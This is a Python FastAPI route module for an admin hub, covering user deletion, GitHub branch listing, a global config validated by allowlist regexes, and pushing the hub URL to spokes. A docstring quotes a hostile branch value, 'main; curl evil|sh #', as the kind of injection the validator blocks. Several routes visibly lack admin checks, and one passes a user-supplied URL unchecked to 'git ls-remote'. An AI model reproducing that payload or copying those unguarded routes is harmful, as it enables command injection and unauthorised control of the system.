"""Setup misc: subnet-filter, delete-user, GitHub repos/branches, global config."""
import re

from api import (
    HTTPException, Request, _FILTER_DEFAULTS, _FILTER_MODULES, _filter_config,
    _invalidate_user_sessions, asyncio, logger,
)


class _ConfigValidationError(ValueError):
    """Raised when an incoming global_config value fails the charset allowlist."""


# Tight charset for git refs (branch/tag names): git forbids a small set of
# ascii (space, ~, ^, :, ?, *, [, \, control) — we allow the common printable
# subset that survives every git transport. URLs get a separate allowlist.
# Anything outside these is rejected at config-write time so the values that
# flow into the hub self-update git argv (create_subprocess_exec, but
# defense-in-depth) can never repoint the hub at an attacker repo / weird ref.
_REF_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/+-]{0,99}$")
_URL_RE = re.compile(
    r"^(https|http|git|ssh)://"        # scheme
    r"[A-Za-z0-9._:/@%~-]{1,253}"      # host+path (no spaces, no shell metachars)
    r"\.git$|^https?://[A-Za-z0-9._:/@%~-]{1,253}$"
)
# Keys under update_sources whose values are repo URLs (validated as URLs).
_URL_SOURCE_KEYS = {
    "hub", "pxmx", "opnsense", "opn", "cs", "cppm", "netbox", "ldap", "nw",
    "le", "agent",
}

# Operator-set hub URL (global_config["hub"]["url"]) — the address agents/spokes
# check in to and get repointed to on a DNS-name change. Accepts a full
# ``wss://host:443/ws/spoke`` URL OR a bare ``host[:port]`` / IP (the spoke's
# ``_normalize_hub_url`` fills in wss:// + :443 + /ws/spoke on apply). Tight
# charset: no spaces or shell metachars — this value is sent to every spoke and
# written into each agent's .env as ``HUB_URL=`` (read back by the systemd
# unit's ExecStart ``--hub $HUB_URL``).
_HUB_URL_RE = re.compile(
    r"^(?:wss|ws)://[A-Za-z0-9._:\[\]-]{1,253}(?:/[A-Za-z0-9._/-]*)?$"  # full ws/wss URL
    r"|^[A-Za-z0-9._:\[\]-]{1,253}$"                                    # bare host[:port]
)


def _validate_update_config(config: dict) -> None:
    """Charset-allowlist the update_sources.* URLs and global_branch before they
    are merged into global_config. These flow into the hub self-update git argv;
    a hostile value (e.g. ``main; curl evil|sh #`` for branch, or an attacker
    repo URL) would otherwise repoint the hub pull. Raises _ConfigValidationError
    on the first bad value so the whole write is rejected (no partial merge)."""
    if not isinstance(config, dict):
        return  # other handlers reject non-dict; not our concern here
    sources = config.get("update_sources")
    if isinstance(sources, dict):
        for k, v in sources.items():
            if v is None:
                continue  # explicit ""/None = "use default / unset" is allowed
            if k in _URL_SOURCE_KEYS and v != "":
                if not isinstance(v, str) or not _URL_RE.match(v):
                    raise _ConfigValidationError(
                        f"update_sources.{k} must be a git URL (got an invalid value).")
            elif isinstance(v, str) and v:
                # non-URL source keys: still bound the charset so nothing exotic
                # rides into a git argv downstream.
                if not _REF_RE.match(v):
                    raise _ConfigValidationError(
                        f"update_sources.{k} contains an invalid character.")
    branch = config.get("global_branch")
    if isinstance(branch, str) and branch and not _REF_RE.match(branch):
        raise _ConfigValidationError(
            "global_branch must be a git ref name (letters, digits, '.', '/', "
            "'-', '+', '_'); got an invalid value.")


def register(app, hub, ctx):
    """Register setup_misc routes on the Hub app."""
    _session_user = ctx._session_user
    _is_admin = ctx._is_admin

    @app.get("/admin/subnet-filter-config")
    async def get_filter_config(request: Request):
        sess = _session_user(request)
        if not sess or not _is_admin(sess):
            raise HTTPException(status_code=403, detail="Admin only")
        return {"modules": _filter_config(app.state.hub),
                "defaults": dict(zip(_FILTER_MODULES,
                                     (_FILTER_DEFAULTS.get(m, False) for m in _FILTER_MODULES)))}

    @app.put("/admin/subnet-filter-config")
    async def set_filter_config(request: Request):
        sess = _session_user(request)
        if not sess or not _is_admin(sess):
            raise HTTPException(status_code=403, detail="Admin only")
        data = await request.json()
        incoming = data.get("modules") or {}
        stored = {}
        for m in _FILTER_MODULES:
            if m in incoming:
                stored[m] = bool(incoming[m])
        app.state.hub.state.system_state["subnet_filter_modules"] = stored
        app.state.hub.state._mark_dirty()
        return {"status": "ok", "modules": _filter_config(app.state.hub)}

    @app.delete("/setup/users/{user_id}")
    async def delete_user(user_id: str):
        hub = app.state.hub
        users = hub.state.system_state.get("users", {})
        if user_id not in users:
            raise HTTPException(status_code=404, detail="User not found")
        if users[user_id].get("protected"):
            raise HTTPException(status_code=403, detail="This account is protected and cannot be deleted")
        del users[user_id]
        await hub.state.save_state_now()
        # Revoke any sessions the deleted user still holds so a saved cookie
        # can't keep hitting the API as a now-nonexistent account.
        _invalidate_user_sessions(hub, user_id)
        return {"status": "ok", "message": f"User {user_id} deleted."}

    @app.get("/setup/github-repos")
    async def get_github_repos():
        try:
            import httpx
            async with httpx.AsyncClient() as client:
                resp = await client.get("https://api.github.com/users/lbockenstedt/repos")
                if resp.status_code != 200:
                    raise HTTPException(status_code=resp.status_code, detail="Failed to fetch repos from GitHub")
                repos = resp.json()
                return {
                    "repos": [
                        {"name": r["name"], "url": r["clone_url"], "description": r["description"]}
                        for r in repos
                    ]
                }
        except Exception as e:
            logger.exception("get_github_repos failed")
            raise HTTPException(status_code=500, detail=str(e))

    @app.get("/setup/github-branches/{repo}")
    async def get_github_branches(repo: str):
        try:
            import httpx
            if "/" not in repo:
                repo_full = f"lbockenstedt/{repo}"
            else:
                repo_full = repo

            async with httpx.AsyncClient() as client:
                resp = await client.get(f"https://api.github.com/repos/{repo_full}/branches")
                if resp.status_code != 200:
                    raise HTTPException(status_code=resp.status_code, detail=f"Failed to fetch branches for {repo_full}")
                branches = resp.json()
                return {
                    "branches": [b["name"] for b in branches]
                }
        except Exception as e:
            logger.exception("get_github_branches failed")
            raise HTTPException(status_code=500, detail=str(e))

    # Canonical branch lister for the WebUI's "Repo Branch" dropdowns. Uses
    # `git ls-remote --heads` on the ACTUAL configured remote (update_sources)
    # rather than the GitHub REST API, so it: works for private repos + non-
    # GitHub remotes (honors the box's git credentials), never hits GitHub's
    # unauthenticated 60/hr rate limit, and lists branches for exactly the URL
    # updates resolve against (mirrors get_remote_commit's ls-remote approach).
    # `repo` may be a full git URL, an "owner/name", or a bare module key
    # (dns/pxmx/cs/…) resolved via update_sources → default lbockenstedt/<key>.
    @app.get("/setup/repo-branches")
    async def get_repo_branches(repo: str):
        raw = (repo or "").strip()
        if not raw:
            raise HTTPException(status_code=400, detail="repo is required")
        # Resolve a module key to its configured/derived remote URL. A value
        # that already looks like a URL or "owner/name" is used as-is.
        if "://" in raw or raw.startswith("git@") or "/" in raw:
            url = raw
        else:
            sources = app.state.hub.state.get_global_config().get("update_sources", {}) or {}
            url = sources.get(raw) or f"https://github.com/lbockenstedt/{raw}"
        try:
            proc = await asyncio.create_subprocess_exec(
                "git", "ls-remote", "--heads", url,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            try:
                out, err = await asyncio.wait_for(proc.communicate(), timeout=20)
            except asyncio.TimeoutError:
                try:
                    proc.kill()
                except ProcessLookupError:
                    pass
                raise HTTPException(status_code=504,
                                    detail=f"Timed out listing branches for {url}")
            if proc.returncode != 0:
                raise HTTPException(status_code=502,
                                    detail=f"git ls-remote failed for {url}: "
                                           f"{err.decode(errors='replace').strip()[:300]}")
            names = []
            for line in out.decode(errors="replace").splitlines():
                # "<sha>\trefs/heads/<branch>"
                parts = line.split("refs/heads/", 1)
                if len(parts) == 2 and parts[1].strip():
                    names.append(parts[1].strip())
            # Surface the conventional trunk branches first, then the rest A→Z.
            priority = {"main": 0, "master": 1, "develop": 2}
            names = sorted(set(names), key=lambda n: (priority.get(n, 3), n.lower()))
            return {"repo": url, "branches": names}
        except HTTPException:
            raise
        except Exception as e:
            logger.exception("get_repo_branches failed")
            raise HTTPException(status_code=500, detail=str(e))

    @app.get("/setup/config")
    async def get_global_config():
        hub = app.state.hub
        return {"global_config": hub.state.system_state.get("global_config", {})}

    @app.post("/setup/config")
    async def update_global_config(request: Request):
        hub = app.state.hub
        try:
            data = await request.json()
            config = data.get("config", {})

            # SECURITY: validate the fields that flow into the hub self-update
            # git argv (update_sources.* URLs + global_branch). They are
            # shell-interpolated-free now (create_subprocess_exec), but a bad
            # value still changes which repo/branch the hub pulls. Reject
            # anything outside a tight charset so a config write can never
            # repoint the hub at an attacker repo or a weird ref. Admin-only
            # route, but config fields must never be arbitrary strings.
            _validate_update_config(config)

            gc = hub.state.system_state.setdefault("global_config", {})
            gc.update(config)
            hub.state._mark_dirty()

            return {"status": "ok", "message": "Global configuration updated."}
        except HTTPException:
            raise
        except _ConfigValidationError as e:
            raise HTTPException(status_code=400, detail=str(e))
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Invalid request: {str(e)}")

    @app.post("/api/setup/hub-url")
    async def set_hub_url(request: Request):
        """Set the operator hub URL (``global_config["hub"]["url"]``) and fan it
        out to every approved spoke immediately. The reconcile-on-connect path in
        ``push_config_to_spoke`` re-sends it on every (re)connect, so spokes
        offline at save time (or that come back later) still self-heal. Admin-only
        — repointing every spoke is high-impact (each applying spoke restarts
        once onto the new address). Empty ``url`` clears the override (spokes keep
        their install-time pin / auto-discovery; no fan-out)."""
        sess = _session_user(request)
        if not sess or not _is_admin(sess):
            raise HTTPException(status_code=403, detail="Admin only")
        hub = app.state.hub
        try:
            data = await request.json()
        except Exception:
            raise HTTPException(status_code=400, detail="Invalid JSON body")
        url = (data.get("url") or "").strip() if isinstance(data, dict) else ""
        if url == "":
            gc = hub.state.system_state.setdefault("global_config", {})
            gc.setdefault("hub", {})["url"] = ""
            hub.state._mark_dirty()
            return {"status": "ok", "message": "Hub URL override cleared.",
                    "pushed": [], "queued": [], "failed": []}
        if not _HUB_URL_RE.match(url):
            raise HTTPException(
                status_code=400,
                detail="hub URL must be a wss:// URL or a bare host/IP "
                       "(e.g. wss://hub.example.com:443 or 172.16.1.31).")
        gc = hub.state.system_state.setdefault("global_config", {})
        gc.setdefault("hub", {})["url"] = url
        hub.state._mark_dirty()
        result = await hub.push_hub_url_to_all_spokes(url)
        return {"status": "ok",
                "message": (f"Hub URL set to {url}; pushed to "
                            f"{len(result['pushed'])}, queued for "
                            f"{len(result['queued'])} offline."),
                "pushed": result["pushed"], "queued": result["queued"],
                "failed": result["failed"]}
